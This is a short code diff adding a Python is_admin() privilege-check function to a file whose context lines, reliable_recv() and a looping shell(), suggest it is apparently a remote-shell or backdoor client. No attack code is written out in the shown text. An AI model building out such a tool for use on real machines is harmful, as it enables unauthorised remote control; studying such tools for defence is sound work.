@@ -66,6 +66,16 @@ def reliable_recv():
         print(f"Error receiving data: {e}")
         raise
 
+def is_admin():
+    try:
+        if os.name == 'nt':  # Windows
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        else:  # Unix/Linux/Mac
+            return os.getuid() == 0  # Root has UID 0
+    except:
+        return False
+
 def shell():
     while True:
         try:
